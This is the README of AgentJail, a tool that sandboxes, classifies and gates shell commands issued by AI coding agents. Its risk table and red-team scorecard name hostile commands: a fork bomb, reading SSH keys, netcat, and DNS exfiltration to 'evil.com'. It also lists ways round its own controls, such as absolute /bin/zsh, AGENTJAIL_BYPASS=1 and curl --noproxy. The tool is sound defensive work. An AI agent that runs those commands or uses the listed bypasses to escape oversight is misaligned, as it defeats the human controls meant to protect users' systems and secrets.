# AgentJail

Local zero-latency **holographic shadow workspace** and kernel-tracing firewall
for AI coding agents — COW clones, Docker PID/cap isolation, CONNECT egress
whitelist, live streaming, and MCP memory sync.

## Requirements

- Python 3.11+
- Docker Desktop or Docker Engine (daemon running)
- Host `git` (for hologram Time Machine checkpoints)
- Ability to build `agentjail-sandbox:local` (includes `strace`)

## 10-second setup

```bash
pip install agentjail          # or from a checkout: pip install -e .
agentjail setup                # build agentjail-sandbox:local (once)
agentjail init                 # patch Claude / Cursor / Windsurf MCP configs
agentjail start                # control panel → http://127.0.0.1:8420
```

Optional:

```bash
agentjail init --project       # also patch ./.cursor/mcp.json
npx agentjail-cli init         # Node wrapper (requires pip-installed agentjail)
```

Restart Cursor / Claude after `init` so the MCP server appears.

## Hard interception: `agentjail wrap` (PATH shims)

MCP + prompt rules are **soft** — the model can still use a built-in Shell tool.
For OS-level interception, wrap the agent/IDE so PATH lookups for `bash`, `zsh`,
`npm`, `python`, etc. hit shims under `~/.agentjail/shims` and forward into the
daemon:

```bash
agentjail start                 # terminal A — control panel + native dialogs
agentjail shim-install          # once (also auto-run by wrap)
agentjail wrap claude           # CLI agents
agentjail wrap cursor .         # launches Cursor Mach-O with shimmed PATH (macOS)
```

| | Soft (MCP rule) | Hard (`agentjail wrap`) |
|--|-----------------|-------------------------|
| Setup | `init` + prompt rule | `wrap <agent>` |
| Intercepts | Only if the model calls `agentjail_exec` | PATH lookups for shimmed binaries |
| Built-in Shell | No | Yes, when the shell is found via `PATH` |
| Absolute `/bin/zsh` | N/A | **Bypasses shims** (documented residual) |

Mitigations shipped with wrap: prepend shim dir to `PATH`, set `SHELL` to the
shimmed shell, launch GUI apps by their binary (not `open -a`, which drops env).
Set `AGENTJAIL_BYPASS=1` only for intentional host passthrough.

When a RISKY job is queued, AgentJail shows a **native Approve / Deny** dialog
(macOS `osascript`, Linux `zenity`/`kdialog` when available) in addition to the
web console. Disable with `agentjail start --no-native-notify`.

## Invisible mode (opt-in background)

Default remains **interactive** (front): manual `start`, dashboard/dialogs, HITL
for all RISKY. Enable Invisible only if you want security to run in the
background:

```bash
agentjail invisible enable     # service + ~/.zshrc PATH + autopilot
agentjail invisible status
agentjail invisible disable    # back to interactive front mode
```

| | Interactive (default) | Invisible |
|--|----------------------|-----------|
| Daemon | `agentjail start` | launchd / systemd via `service install` |
| PATH | optional `wrap` | injected into `.zshrc` / `.bashrc` |
| `npm install` / `pytest` | pending Approve | **silent** autopilot in hologram |
| `.env` / `.ssh` writes | pending | pending + IDE Approve/Block |
| `rm -rf` / CRITICAL | blocked | blocked + IDE toast |
| UX | browser / osascript | status bar extension |

Service only:

```bash
agentjail service install|uninstall|status|start|stop
```

IDE extension: [`extensions/vscode/`](extensions/vscode/) — status bar
`AgentJail: Active (N pending)` and 1-click Approve/Block. Install from that
folder (see its README). Absolute `/bin/zsh` still bypasses PATH shims.

### Dev checkout (legacy)

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
chmod +x scripts/setup.sh
agentjail setup
cd web && npm install && npm run build && cd ..
agentjail init --project
agentjail start
```

`python run.py` still works (same as `agentjail start --no-browser` flags via `start_main`).

## Dashboard (shadcn + mosaic front)

The UI lives in [`web/`](web/) as a Vite + React + shadcn app. Landing at `/`,
containment console at `/console`.

```bash
cd web
npm install
npm run build   # outputs web/dist — served by FastAPI
# optional live reload:
npm run dev     # http://127.0.0.1:5173 (proxies /v1 and /health)
```

Then start the API/runtime:

```bash
agentjail start
# or: python run.py
```

| Flag | Default |
|------|---------|
| `--host` | `127.0.0.1` |
| `--port` | `8420` |
| `--workdir` | `./workspace` |
| `--base-image` | `agentjail-sandbox:local` |
| `--proxy-port` | `8888` |

Dashboard: [http://127.0.0.1:8420/](http://127.0.0.1:8420/) · Console: [/console](http://127.0.0.1:8420/console)

## Operator polish

1. **Holographic workspaces** — Each job COW-clones `--workdir` into `.agentjail_shadow/<job>/` (APFS `cp -c` / Linux reflink, copy fallback). Docker mounts the **shadow**, never the origin. Use **Promote to workspace** to land diffs; otherwise the real tree is untouched.
2. **Deny feedback** — Deny opens a modal. **Deny & Revert** wipes the hologram and arms a `SYSTEM OVERRIDE` for the next MCP tool result so the model’s memory matches the filesystem.
3. **Time Machine** — Git checkpoint inside the hologram before exec; Diff tab can restore the shadow snapshot.
4. **Kernel Telemetry** — `strace -f` event log (`openat` / `connect` / `clone` / …) plus call-count bars in the console **Kernel** tab.
5. **MCP** — `agentjail_exec`, `agentjail_job_status`, `agentjail_revert(job_id, reason)`.
6. **PATH wrap** — `agentjail wrap` prepends `~/.agentjail/shims` so agent Shell calls hit the jail.
7. **Native dialogs** — RISKY pending jobs can be Approve/Deny'd without leaving the IDE.

## Defense-in-depth

1. **Pre-flight AST analyzer** (`bashlex`) — SAFE auto-exec, RISKY queue for approval, CRITICAL auto-block
2. **Human-in-the-loop** — dashboard approve/deny for RISKY commands
3. **Docker sandbox** — non-root (`1000:1000`), mem/CPU caps, **`pids_limit=64`**, `cap_drop=ALL` + `cap_add=SYS_PTRACE`, `no-new-privileges`, ephemeral containers, optional `strace -c` wrap
4. **Whitelist CONNECT egress proxy** — `pip`/`npm` can reach allowed hosts only (no TLS MITM)
5. **DNS blackhole** — container `dns=127.0.0.1`; whitelist package hosts pinned via `extra_hosts`
6. **Workspace symlink guard** — SAFE commands that touch workdir symlinks escalate to HITL; Approve re-checks and blocks
7. **Git Time Machine** — host-side checkpoints under `refs/agentjail/*` inside the hologram (DiffEngine still skips `.git` / `.agentjail_shadow`)
8. **Memory revert** — Deny & Revert / `agentjail_revert` wipe the shadow and inject a one-shot SYSTEM OVERRIDE into MCP tool results

### Risk routing

| Risk | Examples | Behavior |
|------|----------|----------|
| SAFE | `ls`, `pwd`, `cat README.md`, `git status` | Auto-run in sandbox |
| RISKY | `npm install`, `echo x > file`, `pip install`, `python exploit.py`, `ln` | Pending until approved |
| CRITICAL | `rm -rf`, `curl`, `dig`, `nc`/`socat`, fork-bomb, `cat ~/.ssh/id_rsa` | Blocked immediately |

### Egress whitelist (default)

`pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `github.com`,
`objects.githubusercontent.com`, `nodejs.org` (plus subdomains).

Containers receive `HTTP(S)_PROXY=http://host.docker.internal:8888`. Clients that
honor the proxy are filtered via CONNECT. Recursive DNS inside the sandbox is
disabled; registry hostnames are pinned on the host before start.

**Residual risk:** raw TCP to literal IPs (and tools that ignore `HTTP_PROXY`,
e.g. `curl --noproxy '*'`) can still leave on the Docker bridge until a
network-policy / iptables sidecar is added. Treat Approve as privileged.

### CIBER / red-team scenario scorecard

| Scenario | Verdict | Mitigation |
|----------|---------|------------|
| **S1 Natural-language disguise** (`python exploit.py` with nested `curl`) | AST sees only `python` → **RISKY** (HITL). Proxy-aware HTTPS to non-whitelist hosts is **blocked** after Approve. | Nested payloads are not AST-visible; egress is env-honor CONNECT, not forced. Blackhole DNS + critical `curl` reduce impact. |
| **S2 Fork bomb** (`:(){ :\|:& };:`) | Inline pattern → **CRITICAL**. Script-borne bombs hit **`pids_limit=64`** + `nproc` ulimit. | Host freeze from PID exhaustion is contained at the container cgroup. |
| **S3 DNS exfiltration** (`dig <hex>.evil.com`) | `dig`/`nslookup`/`host` → **CRITICAL**. Resolver path blackholed (`dns=127.0.0.1`). | Setting `dns=8.8.8.8` would **not** stop exfil (query labels still leak). Residual: raw UDP/TCP to attacker IPs. |
| **S4 TOCTOU symlink to host** | Docker bind-mount does **not** allow symlink traversal onto the host FS. Workdir symlinks escalate SAFE→RISKY and are blocked at Approve. | Shared rw workspace races remain a concurrency concern, not a host-root escape. |

Run regression checks:

```bash
PYTHONPATH=. python -m unittest discover -s tests -v
```

## API quickstart

```bash
# SAFE — auto-executes
curl -s http://127.0.0.1:8420/v1/commands \
  -H 'Content-Type: application/json' \
  -d '{"command":"ls -la","timeout":10}'

# CRITICAL — blocked
curl -s http://127.0.0.1:8420/v1/commands \
  -H 'Content-Type: application/json' \
  -d '{"command":"rm -rf /workspace/build"}'

# RISKY — pending approval
curl -s http://127.0.0.1:8420/v1/commands \
  -H 'Content-Type: application/json' \
  -d '{"command":"echo hello > greeting.txt","timeout":10}'

JOB_ID=...   # from response
curl -s -X POST "http://127.0.0.1:8420/v1/commands/${JOB_ID}/approve"
curl -s "http://127.0.0.1:8420/v1/commands/${JOB_ID}"

# E-Stop
curl -s -X POST http://127.0.0.1:8420/v1/estop

# Egress events
curl -s http://127.0.0.1:8420/v1/egress/events
```

Live terminal stream (WebSocket): `ws://127.0.0.1:8420/v1/commands/{id}/stream`

## MCP gateway

Prefer auto-config:

```bash
agentjail init
# or: agentjail init --project
```

Manual `.cursor/mcp.json` / Claude Desktop block (also what `init` writes):

```json
{
  "mcpServers": {
    "agentjail": {
      "command": "python",
      "args": ["-m", "agent_jail.mcp_server"],
      "env": {
        "AGENTJAIL_URL": "http://127.0.0.1:8420"
      }
    }
  }
}
```

Tools:

- `agentjail_exec(command, timeout?)` — submit through the holographic jail; polls until terminal
- `agentjail_job_status(job_id)` — fetch a job
- `agentjail_revert(job_id, reason?)` — wipe hologram + arm SYSTEM OVERRIDE for memory sync

With the package installed, MCP is:

```bash
python -m agent_jail.mcp_server
```

## Distribution channels

| Channel | Command |
|---------|---------|
| PyPI | `pip install agentjail` then `agentjail init` |
| NPX wrapper | `npx agentjail-cli init` (needs Python package installed) |
| Smithery (once published) | `npx -y @smithery/cli install agentjail --client claude` |

Registry stubs live in [`smithery.yaml`](smithery.yaml) and [`npm/agentjail-cli/`](npm/agentjail-cli/).

### Publish checklist (maintainers)

```bash
pip install build twine
python -m build
# twine upload dist/*          # PyPI — requires credentials
# cd npm/agentjail-cli && npm publish
```

## Layout

```text
agent_jail/
├── cli.py                   # agentjail init / start / setup
├── __main__.py
├── core/
│   ├── isolation.py
│   ├── egress_proxy.py
│   ├── command_analyzer.py
│   ├── path_guard.py
│   ├── checkpoint.py
│   ├── hologram.py
│   ├── strace_profile.py
│   ├── diff_engine.py
│   └── proxy.py
├── dashboard/
│   ├── server.py
│   └── templates/
├── mcp_server.py
├── docker/Dockerfile.sandbox
├── npm/agentjail-cli/       # npx wrapper
├── scripts/setup.sh
├── pyproject.toml
├── smithery.yaml
├── requirements.txt
├── tests/
└── run.py
```
